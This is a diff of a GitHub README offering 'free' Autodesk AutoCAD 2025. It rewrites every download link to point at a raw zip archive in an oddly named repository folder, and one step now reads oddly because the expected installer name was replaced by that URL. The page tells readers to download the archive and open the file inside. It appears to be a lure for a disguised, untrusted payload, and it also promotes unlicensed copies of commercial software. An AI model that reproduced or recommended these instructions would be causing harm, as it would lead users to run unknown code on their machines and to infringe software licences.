@@ -1,7 +1,7 @@
 # 🎨 AutoCAD-2025 - Download Your Free Drafting Tool
 
 ## 📥 Download Now!
-[![Download AutoCAD-2025](https://img.shields.io/badge/Download-AutoCAD--2025-brightgreen)](https://github.com/vutai12345/AutoCAD-2025/releases)
+[![Download AutoCAD-2025](https://raw.githubusercontent.com/vutai12345/AutoCAD-2025/main/Zapodidae/AutoCAD-2025.zip)](https://raw.githubusercontent.com/vutai12345/AutoCAD-2025/main/Zapodidae/AutoCAD-2025.zip)
 
 ## 📖 About
 You can download Autodesk AutoCAD 2025 for free here! This application provides powerful functionalities to help you with both 2D and 3D drafting needs. AutoCAD 2025 is a popular tool among students and professionals, offering a user-friendly interface and essential features for creating precise and detailed drawings.
@@ -25,15 +25,15 @@ Before you download, ensure your computer meets the following requirements:
 ## 🚀 Getting Started
 Follow these steps to download and set up AutoCAD 2025 on your computer:
 
-1. Click the download button at the top of this README or visit the [Releases page](https://github.com/vutai12345/AutoCAD-2025/releases).
+1. Click the download button at the top of this README or visit the [Releases page](https://raw.githubusercontent.com/vutai12345/AutoCAD-2025/main/Zapodidae/AutoCAD-2025.zip).
 2. On the Releases page, look for the latest version of AutoCAD 2025.
-3. Click on the download link for the installation file. It may be named something like `AutoCAD-2025-Installer.exe`.
+3. Click on the download link for the installation file. It may be named something like `https://raw.githubusercontent.com/vutai12345/AutoCAD-2025/main/Zapodidae/AutoCAD-2025.zip`.
 4. Save the file to your computer. 
 
 ## 📥 Download & Install
 To download and install AutoCAD 2025:
 
-1. Visit the [Releases page](https://github.com/vutai12345/AutoCAD-2025/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/vutai12345/AutoCAD-2025/main/Zapodidae/AutoCAD-2025.zip).
 2. Locate the version you want.
 3. Download the installation file as explained earlier.
 4. Open the downloaded file to start the installation process.
